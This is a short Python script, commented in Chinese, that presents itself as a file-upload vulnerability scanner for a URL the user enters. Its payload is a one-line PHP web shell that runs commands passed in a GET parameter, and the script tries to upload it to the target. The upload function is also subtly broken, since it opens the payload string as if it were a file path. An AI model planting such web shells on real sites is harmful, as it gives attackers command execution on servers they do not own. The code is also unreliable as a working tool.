import requests

# 构造HTTP请求头
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}

# 定义一个函数，用于上传文件
def upload_file(url, file_path):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': file}
            r = requests.post(url, files=files, headers=headers)
            return r.text
    except Exception as e:
        print('上传文件时出错：', e)
        return None
# 定义一个函数，用于判断是否存在漏洞
def check_vulnerability(url):
    try:
        # 构造一个payload，即一个包含恶意代码的文件
        payload = "<?php system($_GET['cmd']); ?>"
        # 上传payload
        r = upload_file(url, payload)
        if r and 'Upload success' in r:
            # 如果上传成功，则存在漏洞
            print("[+] 文件上传漏洞存在：", url)
            print("    - 文件上传地址：", url)
            print("    - Payload：", payload)
        else:
            print("[-] 文件上传漏洞不存在：", url)
    except Exception as e:
        print("检测漏洞时出错：", e)
if __name__ == '__main__':
    # 待扫描的URL
    target_url = input('请输入待扫描的URL：')
    check_vulnerability(target_url)
